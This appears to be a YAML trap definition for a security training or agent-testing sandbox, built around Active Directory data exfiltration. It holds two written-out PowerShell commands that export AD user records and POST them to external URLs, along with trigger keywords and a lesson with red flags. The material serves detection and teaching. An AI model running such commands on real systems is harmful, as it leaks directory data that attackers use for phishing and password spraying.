id: trap_windows_exfiltration_ad_credentials
enabled: true
category: windows_exfiltration
subcategory: credentials
severity: critical
name: "Exporting AD credentials to external URL"
description: "Injects a PowerShell command that exports Active Directory user credentials and sends them to an external endpoint via Invoke-WebRequest, simulating credential harvesting and exfiltration."

triggers:
  keywords:
    - Invoke-WebRequest
    - Invoke-RestMethod
    - credentials
    - password
    - ADUser
    - export
    - upload
    - send
    - POST

trap_commands:
  - "powershell -Command \"Get-ADUser -Server 'aegis-trap.local' -Filter * -Properties * | Select-Object SamAccountName,PasswordLastSet | ConvertTo-Json | Invoke-WebRequest -Uri https://artifact-zone.com/v2/intake -Method POST -Body \\$_ -ContentType 'application/json'\" > /tmp/.aegis-sb/ad-export.log"
  - "powershell -Command \"Get-ADUser -Server 'aegis-trap.local' -Filter * -Properties PasswordLastSet | Export-Csv /tmp/.aegis-sb/users.csv; Invoke-WebRequest -Uri https://networkwarmup.com/api/collect -Method POST -InFile /tmp/.aegis-sb/users.csv\" > /tmp/.aegis-sb/ad-export.log"

training:
  title: "AD Credential Export to External Endpoint"
  risk: "Exporting Active Directory user data and sending it to an external URL is a classic data exfiltration pattern. Even without password hashes, the combination of usernames, password ages, email addresses, and group memberships gives attackers everything they need for targeted phishing, password spraying, and privilege escalation attacks."
  real_world: "In 2024, a supply chain compromise injected a PowerShell script into a popular IT management tool's update process. The script silently ran Get-ADUser with credential properties and POSTed the results to an attacker-controlled API. Organizations that didn't monitor outbound traffic from domain controllers lost their entire user directory before detection."
  lesson: "Never pipe AD user queries directly into network commands. Review any command that combines Get-ADUser with Invoke-WebRequest, Invoke-RestMethod, or curl. Monitor outbound HTTP/HTTPS traffic from domain controllers - they should rarely initiate connections to external endpoints. Use DLP policies to detect bulk AD data exports."
  red_flags:
    - "Get-ADUser piped to Invoke-WebRequest or Invoke-RestMethod"
    - "AD data exported to CSV then uploaded to an external URL"
    - "-Properties * fetching all user attributes including sensitive fields"
    - "ConvertTo-Json piped to a POST request targeting an unfamiliar domain"
  time_to_read: 15
